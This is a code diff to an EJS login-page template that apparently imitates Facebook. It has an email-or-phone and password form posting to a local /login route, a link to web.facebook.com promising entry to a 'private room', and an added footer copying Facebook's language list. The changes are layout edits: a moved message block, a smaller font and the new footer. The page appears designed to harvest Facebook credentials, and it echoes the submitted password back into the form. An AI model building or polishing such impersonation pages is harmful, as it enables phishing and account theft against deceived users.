@@ -12,7 +12,7 @@
             padding: 15px;
             margin: 15px 0;
             border-radius: 8px;
-            font-size: 16px;
+            font-size: 12px;
             font-weight: bold;
             text-align: center;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
@@ -42,6 +42,11 @@
         </div>
         <div class="right-side">
             <div class="login-box">
+                <% if (message) { %>
+                    <div class="message <% if (message.includes('success')) { %> success <% } else { %> error <% } %>">
+                        <%= message %>
+                    </div>
+                <% } %>
                 <form action="/login" method="post">
                     <input type="text" name="email" placeholder="Email address or phone number" required value="<%= email %>">
                     <input type="password" name="password" placeholder="Password" required value="<%= password %>">
@@ -53,17 +58,33 @@
                     </div>
                 </form>
             </div>
-            <% if (message) { %>
-                <div class="message <% if (message.includes('success')) { %> success <% } else { %> error <% } %>">
-                    <%= message %>
-                </div>
-            <% } %>
             <div class="form-b">
                 <a href="https://web.facebook.com/?_rdc=1&_rdr" class="create-p">Log In</a>
                 to join the private room.
             </div>
         </div>
     </div>
+
+    <footer>
+        <div class="foot-wrapper">
+            <ul>
+                <li><a href="">(UK)</a> </li>
+                <li><a href="">Hausa</a></li>
+                <li><a href="">Français (France)</a></li>
+                <li><a href="">Português (Brasil)</a></li>
+                <li><a href="">Español</a> </li>
+                <li></li><a href="">العربية</a></li>
+                <li><a href="">Bahasa Indonesia</a></li>
+                <li><a href="">Deutsch</a></li>
+                <li><a href="">日本語</a></li>
+                <li><a href="">Italiano</a></li>
+                <li><a href="">हिन्दी</a></li>
+            </ul>
+        </div>
+    </footer>
 </body>
 
 </html>
+
+
+
